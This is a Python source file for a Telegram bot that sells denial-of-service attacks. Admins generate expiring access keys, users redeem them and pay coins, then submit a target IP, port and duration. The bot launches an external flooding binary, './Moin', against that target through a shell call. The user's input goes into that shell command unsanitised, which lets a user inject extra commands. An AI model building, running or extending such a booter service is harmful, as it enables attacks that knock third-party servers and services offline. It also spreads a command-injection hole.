import os
import telebot
import subprocess
import datetime
import threading
import json
import random
import string
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

bot = telebot.TeleBot('YOUR_BOT_TOKEN_HERE')

# Admin user IDs
admin_id = ["7409754329"]

# File to store user data and keys
USER_DATA_FILE = "users_data.json"
KEYS_FILE = "keys.json"

# Load user data from JSON file
def load_user_data():
    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, "r") as file:
            return json.load(file)
    else:
        return {}

# Save user data to JSON file
def save_user_data(data):
    with open(USER_DATA_FILE, "w") as file:
        json.dump(data, file, indent=4)

# Load generated keys
def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r") as file:
            return json.load(file)
    else:
        return {}

# Save keys to JSON file
def save_keys(data):
    with open(KEYS_FILE, "w") as file:
        json.dump(data, file, indent=4)

# Generate a random key
def generate_random_key(length=10):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

# Admin command to generate keys
@bot.message_handler(commands=['genkey'])
def generate_key(message):
    admin_user = str(message.chat.id)
    if admin_user not in admin_id:  # Only admins can generate keys
        bot.reply_to(message, "ðŸš« You do not have permission to generate keys!")
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "â—ï¸ Usage: /genkey <time_in_hours>")
        return

    try:
        time_in_hours = int(args[1])
    except ValueError:
        bot.reply_to(message, "â—ï¸ Invalid time format! Use an integer (e.g., /genkey 24).")
        return

    key = generate_random_key()
    expiration_time = datetime.datetime.now() + datetime.timedelta(hours=time_in_hours)

    keys = load_keys()
    keys[key] = expiration_time.strftime("%Y-%m-%d %H:%M:%S")
    save_keys(keys)

    bot.reply_to(message, f"âœ… Key generated: `{key}` (Valid for {time_in_hours} hours)")

# Admin command to delete keys
@bot.message_handler(commands=['delkey'])
def delete_key(message):
    admin_user = str(message.chat.id)
    if admin_user not in admin_id:  # Only admins can delete keys
        bot.reply_to(message, "ðŸš« You do not have permission to delete keys!")
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "â—ï¸ Usage: /delkey <key>")
        return

    key = args[1]
    keys = load_keys()

    if key in keys:
        del keys[key]
        save_keys(keys)
        bot.reply_to(message, f"âœ… Key `{key}` has been deleted.")
    else:
        bot.reply_to(message, "âŒ Invalid key! Key not found.")

# Users redeem the key to get approved
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.chat.id)
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "â—ï¸ Usage: /redeem <key>")
        return

    key = args[1]
    keys = load_keys()

    if key not in keys:
        bot.reply_to(message, "âŒ Invalid or expired key!")
        return

    expiration_time = datetime.datetime.strptime(keys[key], "%Y-%m-%d %H:%M:%S")

    user_data = load_user_data()
    user_data[user_id] = user_data.get(user_id, {})
    user_data[user_id]['approved_until'] = expiration_time.strftime("%Y-%m-%d %H:%M:%S")
    save_user_data(user_data)

    # Remove the key after redemption
    del keys[key]
    save_keys(keys)

    bot.reply_to(message, f"âœ… Successfully redeemed! You are approved until {expiration_time}.")

# Function to check if a user is approved
def is_user_approved(user_id):
    user_data = load_user_data()
    if user_id not in user_data or 'approved_until' not in user_data[user_id]:
        return False  # Not approved
    
    expiration_time = datetime.datetime.strptime(user_data[user_id]['approved_until'], "%Y-%m-%d %H:%M:%S")
    return datetime.datetime.now() < expiration_time  # True if approval is still valid

# Attack command with no cooldown restriction
@bot.message_handler(func=lambda message: message.text.lower() == "ðŸš€ attack")
def handle_attack_button_press(message):
    user_id = str(message.chat.id)
    user_data = load_user_data()
    
    if user_id not in user_data:
        user_data[user_id] = {"coins": 0, "registered_on": str(datetime.datetime.now())}
        save_user_data(user_data)

    # Check if user is approved
    if not is_user_approved(user_id):
        bot.reply_to(message, "â›”ï¸ You are not approved to attack! Please redeem a key or ask an admin for approval.")
        return

    bot.reply_to(message, "Enter the target IP, port, and duration (seconds) separated by spaces.")
    bot.register_next_step_handler(message, process_attack_input)

# Processing user attack input
def process_attack_input(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) == 3:
        target = command[0]
        try:
            port = int(command[1])
            time = int(command[2])
        except ValueError:
            bot.reply_to(message, "â—ï¸ Invalid port or time format!")
            return
        
        if time > 250:
            bot.reply_to(message, "â—ï¸ Error: Use less than 250 seconds! â—ï¸")
            return

        attack_thread = threading.Thread(target=process_attack, args=(message, target, port, time))
        attack_thread.start()
    else:
        bot.reply_to(message, "â—ï¸ Invalid format! Use: <IP> <Port> <Time>")

# Function to execute the attack
def process_attack(message, target, port, time):
    user_id = str(message.chat.id)
    user_data = load_user_data()

    if user_data.get(user_id, {}).get('coins', 0) < 5:
        bot.reply_to(message, "â—ï¸ You do not have enough coins to attack! â—ï¸")
        return

    user_data[user_id]['coins'] -= 5
    save_user_data(user_data)

    bot.reply_to(message, f"ðŸš€ Attack Sent Successfully!
Target: {target}
Time: {time} sec
")

    full_command = f"./Moin {target} {port} {time}"
    try:
        subprocess.run(full_command, shell=True, check=True)
    except subprocess.CalledProcessError:
        bot.reply_to(message, "â—ï¸ Error: Failed to execute the attack! â—ï¸")
        return

    bot.reply_to(message, "âœ… Attack Completed!")

# Start polling
bot.polling(none_stop=True)